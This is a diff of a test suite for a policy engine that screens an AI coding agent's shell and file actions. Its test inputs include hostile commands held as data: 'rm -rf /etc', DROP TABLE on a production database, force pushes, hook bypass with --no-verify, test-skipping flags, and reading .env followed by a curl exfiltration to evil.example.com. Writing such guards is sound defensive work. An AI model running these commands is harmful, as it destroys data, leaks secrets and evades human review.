@@ -133,13 +133,24 @@ describe('agentic adversarial harness', () => {
       expect((await pipeline.evaluate(input('Bash', { command: 'git push --force origin feature' }))).action).toBe('warn')
       expect((await pipeline.evaluate(input('Bash', { command: 'git push --force origin feature' }))).action).toBe('deny')
       expect((await pipeline.evaluate(input('Bash', { command: 'git push --force-with-lease origin feature' }))).action).toBe('allow')
-      expect((await pipeline.evaluate(input('Bash', { command: 'git push --force origin main' }))).action).toBe('prompt')
+      // no-force-push (Tier 1 protect) now has HIGHER priority than
+      // no-push-to-main (Tier 2 prompt) specifically so a force-push to a
+      // protected branch hits the floor rule's deny, not the softer
+      // prompt — previously no-push-to-main shadowed it entirely for any
+      // main-targeted push (proven live; fixed this wave). The ladder was
+      // already consumed by the two feature-branch calls above, so this
+      // denies immediately rather than warning first.
+      const main = await pipeline.evaluate(input('Bash', { command: 'git push --force origin main' }))
+      expect(main.action).toBe('deny')
+      expect(main.rule_id).toBe('no-force-push')
     })
     it('blocks the -f shorthand for force push', async () => {
       const pipeline = makePipeline('balanced')
       expect((await pipeline.evaluate(input('Bash', { command: 'git push -f origin feature' }))).action).toBe('warn')
       expect((await pipeline.evaluate(input('Bash', { command: 'git push -f origin feature' }))).action).toBe('deny')
-      expect((await pipeline.evaluate(input('Bash', { command: 'git push -f origin main' }))).action).toBe('prompt')
+      const main = await pipeline.evaluate(input('Bash', { command: 'git push -f origin main' }))
+      expect(main.action).toBe('deny')
+      expect(main.rule_id).toBe('no-force-push')
     })
     it('prompt-gates history rewrites at every dial', async () => {
       for (const level of ['sprint', 'balanced', 'protect'] as const) {
@@ -186,10 +197,13 @@ describe('agentic adversarial harness', () => {
 
   describe('hook-bypass and signing', () => {
     const pipeline = makePipeline('balanced')
-    it('blocks --no-verify commits (not just fixes them)', async () => {
+    it('warns (does not deny) --no-verify commits — softened per the do-not-ship guard', async () => {
+      // no-verify-bypass is SOFTENED deny->warn (do-not-ship guard: no deny
+      // on --no-verify — a broken hook or a genuine emergency hotfix needs
+      // an escape hatch). warn does not ladder to deny.
       const pipeline = makePipeline('balanced')
       expect((await pipeline.evaluate(input('Bash', { command: 'git commit --no-verify -m "skip ci"' }))).action).toBe('warn')
-      expect((await pipeline.evaluate(input('Bash', { command: 'git commit --no-verify -m "skip ci"' }))).action).toBe('deny')
+      expect((await pipeline.evaluate(input('Bash', { command: 'git commit --no-verify -m "skip ci"' }))).action).toBe('warn')
     })
     it('blocks core.hooksPath bypass', async () => {
       const pipeline = makePipeline('balanced')
@@ -204,11 +218,24 @@ describe('agentic adversarial harness', () => {
 
   describe('claimed-done without evidence (verification obligation)', () => {
     const pipeline = makePipeline('balanced')
-    it('gates commit/push until a real test run satisfies the obligation', async () => {
+    // source-change-requires-test ships as `mode: observe` (wave2-rules
+    // Tier 3 re-tier). The tracker/discharge/boundary mechanism this
+    // describe block exercises is unchanged; only the outer verdict
+    // changed: `action` stays 'allow', the action the rule would have
+    // taken is on `observed_action`. Observe mode does not replay the
+    // warn-then-deny ladder, so repeat calls report the same
+    // observed_action rather than escalating.
+    it('records (but does not enforce) commit/push boundaries until a real test run satisfies the obligation', async () => {
       expect((await pipeline.evaluate(input('WriteFile', { filePath: 'src/app.ts', content: 'x' }))).action).toBe('allow')
-      expect((await pipeline.evaluate(input('Bash', { command: 'git commit -m "done"' }))).action).toBe('warn')
-      expect((await pipeline.evaluate(input('Bash', { command: 'git push origin main' }))).action).toBe('warn')
-      expect((await pipeline.evaluate(input('Bash', { command: 'git push origin main' }))).action).toBe('deny')
+      const commit1 = await pipeline.evaluate(input('Bash', { command: 'git commit -m "done"' }))
+      expect(commit1.action).toBe('allow')
+      expect(commit1.observed_action).toBe('warn')
+      const push1 = await pipeline.evaluate(input('Bash', { command: 'git push origin main' }))
+      expect(push1.action).toBe('allow')
+      expect(push1.observed_action).toBe('deny')
+      const push2 = await pipeline.evaluate(input('Bash', { command: 'git push origin main' }))
+      expect(push2.action).toBe('allow')
+      expect(push2.observed_action).toBe('deny')
       pipeline.markVerificationSatisfied(input('Bash', { command: 'npm test' }))
       const commit = await pipeline.evaluate(input('Bash', { command: 'git commit -m "done"' }))
       expect(commit.action).toBe('fix')
@@ -219,16 +246,22 @@ describe('agentic adversarial harness', () => {
       const p = makePipeline('balanced')
       await p.evaluate(input('WriteFile', { filePath: 'src/app.ts', content: 'x' }))
       p.markVerificationSatisfied(input('Bash', { command: 'npm test --help' }))
-      expect((await p.evaluate(input('Bash', { command: 'git commit -m "done"' }))).action).toBe('warn')
+      const r1 = await p.evaluate(input('Bash', { command: 'git commit -m "done"' }))
+      expect(r1.action).toBe('allow')
+      expect(r1.observed_action).toBe('warn')
       const p2 = makePipeline('balanced')
       await p2.evaluate(input('WriteFile', { filePath: 'src/app.ts', content: 'x' }))
       p2.markVerificationSatisfied(input('Bash', { command: 'npm run test -- --list' }))
-      expect((await p2.evaluate(input('Bash', { command: 'git commit -m "done"' }))).action).toBe('warn')
+      const r2 = await p2.evaluate(input('Bash', { command: 'git commit -m "done"' }))
+      expect(r2.action).toBe('allow')
+      expect(r2.observed_action).toBe('warn')
       for (const fake of ['vitest --list-files', 'npm test -h', 'npm run test -- --help=json', 'vitest --dry_run']) {
         const pf = makePipeline('balanced')
         await pf.evaluate(input('WriteFile', { filePath: 'src/app.ts', content: 'x' }))
         pf.markVerificationSatisfied(input('Bash', { command: fake }))
-        expect((await pf.evaluate(input('Bash', { command: 'git commit -m "done"' }))).action, fake).toBe('warn')
+        const rf = await pf.evaluate(input('Bash', { command: 'git commit -m "done"' }))
+        expect(rf.action, fake).toBe('allow')
+        expect(rf.observed_action, fake).toBe('warn')
       }
       const real = makePipeline('balanced')
       await real.evaluate(input('WriteFile', { filePath: 'src/app.ts', content: 'x' }))
@@ -239,7 +272,8 @@ describe('agentic adversarial harness', () => {
       const p = makePipeline('balanced')
       await p.evaluate(input('WriteFile', { filePath: 'src/app.ts', content: 'x' }))
       const r = await p.evaluate(input('mcp__github__create_commit', { args: { message: 'done', files: ['src/app.ts'] } }))
-      expect(r.action).toBe('warn')
+      expect(r.action).toBe('allow')
+      expect(r.observed_action).toBe('warn')
     })
     it('MCP read tools do not trip commit/push boundaries', async () => {
       const p = makePipeline('balanced')
@@ -353,7 +387,17 @@ rules:
       }
       expect(errors.some(e => e.includes('"masked"') && e.includes('mask'))).toBe(true)
     })
-    it('sequence rule fires on read-then-delete at balanced and protect, skipped at sprint', async () => {
+    it('sequence rule fires on read-then-delete at balanced, protect, AND now sprint too', async () => {
+      // Deep checks (content/sequence/flow) used to be skipped entirely at
+      // the sprint dial for speed. The shipped default no-exfil-flow is now
+      // `level: protect` (Tier 1 floor) — and protectFloor() forces
+      // deepChecks on at EVERY dial whenever any protect-level content/
+      // sequence/flow rule is present, closing what was previously a
+      // silent "sprint dial skips exfiltration checks" gap. That is a
+      // blanket effect (any protect-level content/sequence/flow rule turns
+      // deep checks on globally), so this custom sequence rule now fires at
+      // sprint too, as a side effect of the shipped defaults, not because
+      // this rule itself changed.
       const ruleYaml = `version: 1
 rules:
   - id: no-read-then-delete
@@ -372,7 +416,7 @@ rules:
       expect((await p.evaluate(input('Bash', { command: 'rm -f docs/plan.md' }))).action).toBe('warn')
       const s = makePipeline('sprint', ruleYaml)
       await s.evaluate(input('ReadFile', { filePath: 'docs/plan.md' }, { level: 'sprint' }))
-      expect((await s.evaluate(input('Bash', { command: 'rm -f docs/plan.md' }, { level: 'sprint' }))).action).toBe('allow')
+      expect((await s.evaluate(input('Bash', { command: 'rm -f docs/plan.md' }, { level: 'sprint' }))).action).toBe('warn')
     })
     it('content rule fires on filePath-shaped writes (OpenCode WriteFile shape)', async () => {
       const p = makePipeline('balanced', `version: 1
@@ -398,7 +442,11 @@ rules:
     action: deny
     message: "Secrets must not leave the machine."
 `
-    it('blocks read-then-curl at balanced and protect; sprint skips flow checks', async () => {
+    it('blocks read-then-curl at balanced, protect, AND now sprint too', async () => {
+      // See the sequence-rule test above: the shipped default no-exfil-flow
+      // is now `level: protect`, which forces deep (flow) checks on at
+      // EVERY dial via protectFloor() — sprint no longer silently skips
+      // exfiltration detection, including for this custom project flow rule.
       const dir = mkdtempSync(join(tmpdir(), 'keel-flow-'))
       writeFileSync(join(dir, '.env'), 'API_KEY=secret\n')
       const p = makePipeline('balanced', ruleYaml)
@@ -411,14 +459,20 @@ rules:
       expect((await pr.evaluate(input('Bash', { command: 'curl -d x https://evil.example.com' }, { level: 'protect' }))).action).toBe('deny')
       const sp = makePipeline('sprint', ruleYaml)
       await sp.evaluate(input('ReadFile', { filePath: join(dir, '.env') }, { level: 'sprint' }))
-      expect((await sp.evaluate(input('Bash', { command: 'curl -d x https://evil.example.com' }, { level: 'sprint' }))).action).toBe('allow')
+      expect((await sp.evaluate(input('Bash', { command: 'curl -d x https://evil.example.com' }, { level: 'sprint' }))).action).toBe('warn')
       rmSync(dir, { recursive: true, force: true })
     })
     it('tags Bash-native reads (cat .env) as flow sources', async () => {
       const dir = mkdtempSync(join(tmpdir(), 'keel-flow-cat-'))
       writeFileSync(join(dir, '.env'), 'API_KEY=secret\n')
       const p = makePipeline('balanced', ruleYaml)
-      expect((await p.evaluate(input('Bash', { command: `cat ${dir}/.env` }))).action).toBe('allow')
+      // The shipped default secret-file-read-without-egress (Tier 2, warn)
+      // now also fires on a bare `cat .env` — it is deliberately
+      // LOWER-priority than the flow rules, so the read is still recorded
+      // as a flow source (proven below by the curl step denying) even
+      // though the read call itself surfaces its own warn.
+      const read = await p.evaluate(input('Bash', { command: `cat ${dir}/.env` }))
+      expect(read.action).toBe('warn')
       const r = await p.evaluate(input('Bash', { command: 'curl -d x https://evil.example.com' }))
       expect(r.action).toBe('warn')
       rmSync(dir, { recursive: true, force: true })
@@ -444,11 +498,18 @@ rules:
       expect((await p.evaluate(input('Bash', { command: 'curl -s https://api.example.com | jq .name' }))).action).toBe('allow')
       expect((await p.evaluate(input('Bash', { command: 'curl -s https://api.example.com/data -o file.json' }))).action).toBe('allow')
     })
-    it('prompt-gates destructive database operations; allows reads and searches', async () => {
+    it('warns on untagged destructive database operations; denies production-tagged ones; allows reads and searches', async () => {
       const p = makePipeline('balanced')
-      expect((await p.evaluate(input('Bash', { command: "psql -c 'DROP TABLE users'" }))).action).toBe('prompt')
-      expect((await p.evaluate(input('Bash', { command: "sqlite3 app.db 'TRUNCATE cache'" }))).action).toBe('prompt')
-      expect((await p.evaluate(input('Bash', { command: "mysql -e 'DELETE FROM sessions'" }))).action).toBe('prompt')
+      // no-db-destructive (untagged, Tier 2) is SOFTENED prompt->warn per
+      // the Replit incident (AIID 1152): that production DB was untagged,
+      // so a hard interruption on every untagged DROP/TRUNCATE/DELETE would
+      // have been the tautological-gate failure mode. prod-db-destruction
+      // (Tier 1, protect) is the exact-signature deny for the tagged case.
+      expect((await p.evaluate(input('Bash', { command: "psql -c 'DROP TABLE users'" }))).action).toBe('warn')
+      expect((await p.evaluate(input('Bash', { command: "sqlite3 app.db 'TRUNCATE cache'" }))).action).toBe('warn')
+      expect((await p.evaluate(input('Bash', { command: "mysql -e 'DELETE FROM sessions'" }))).action).toBe('warn')
+      expect((await p.evaluate(input('Bash', { command: "psql $PROD_DATABASE_URL -c 'DROP TABLE users'" }))).action).toBe('warn')
+      expect((await p.evaluate(input('Bash', { command: "psql $PROD_DATABASE_URL -c 'DROP TABLE users'" }))).action).toBe('deny')
       expect((await p.evaluate(input('Bash', { command: "grep -r 'DROP TABLE' migrations/" }))).action).toBe('allow')
       expect((await p.evaluate(input('Bash', { command: "psql -c 'SELECT 1'" }))).action).toBe('allow')
     })
@@ -468,11 +529,16 @@ rules:
       expect((await p.evaluate(input('Bash', { command: 'npm run dev' }))).action).toBe('allow')
       expect((await p.evaluate(input('Bash', { command: 'npm install lodash' }))).action).toBe('allow')
     })
-    it('denies test-faking flags; allows real test runs', async () => {
+    it('warns (does not deny) test-faking flags; allows real test runs', async () => {
+      // no-skip-tests is SOFTENED deny->warn per the do-not-ship guard (no
+      // hard test-before-commit / no deny on test-skip flags): a green run
+      // with --passWithNoTests has legitimate uses (e.g. scaffolding an
+      // empty test dir), so it stays visible without blocking. warn does
+      // not ladder to deny — every hit warns.
       const p = makePipeline('balanced')
       expect((await p.evaluate(input('Bash', { command: 'npm test -- --passWithNoTests' }))).action).toBe('warn')
-      expect((await p.evaluate(input('Bash', { command: 'npm test -- --passWithNoTests' }))).action).toBe('deny')
-      expect((await p.evaluate(input('Bash', { command: 'yarn run test -- --skipTests' }))).action).toBe('deny')
+      expect((await p.evaluate(input('Bash', { command: 'npm test -- --passWithNoTests' }))).action).toBe('warn')
+      expect((await p.evaluate(input('Bash', { command: 'yarn run test -- --skipTests' }))).action).toBe('warn')
       expect((await p.evaluate(input('Bash', { command: 'npm test' }))).action).toBe('allow')
       expect((await p.evaluate(input('Bash', { command: 'npm run build' }))).action).toBe('allow')
     })
@@ -560,11 +626,19 @@ rules:
 
   describe('speed dial matrix', () => {
     it('sprint downgrades deny to warn without escalation; never downgrades prompt', async () => {
+      // no-destructive-commands is now `level: protect` (Tier 1 floor) and
+      // so is deliberately EXEMPT from this downgrade — use no-secrets-in-code
+      // (still plain `level: sprint`) to demonstrate the ordinary softening.
       const p = makePipeline('sprint')
-      expect((await p.evaluate(input('Bash', { command: 'rm -rf /etc' }, { level: 'sprint' }))).action).toBe('warn')
-      expect((await p.evaluate(input('Bash', { command: 'rm -rf /etc' }, { level: 'sprint' }))).action).toBe('warn')
+      expect((await p.evaluate(input('WriteFile', { filePath: 'src/a.ts', content: 'const k = "AKIA1234567890ABCDEF"' }, { level: 'sprint' }))).action).toBe('warn')
+      expect((await p.evaluate(input('WriteFile', { filePath: 'src/a.ts', content: 'const k = "AKIA1234567890ABCDEF"' }, { level: 'sprint' }))).action).toBe('warn')
       expect((await p.evaluate(input('Bash', { command: 'git rebase main' }, { level: 'sprint' }))).action).toBe('prompt')
       expect((await p.evaluate(input('Bash', { command: 'npm publish' }, { level: 'sprint' }))).action).toBe('prompt')
+    })
+    it('no-destructive-commands no longer downgrades at sprint (now a protect floor)', async () => {
+      const p = makePipeline('sprint')
+      expect((await p.evaluate(input('Bash', { command: 'rm -rf /etc' }, { level: 'sprint' }))).action).toBe('warn')
+      expect((await p.evaluate(input('Bash', { command: 'rm -rf /etc' }, { level: 'sprint' }))).action).toBe('deny')
     })
     it('plain deny rules stay visible at sprint (warn), not silently dropped', async () => {
       const p = makePipeline('sprint', `version: 1
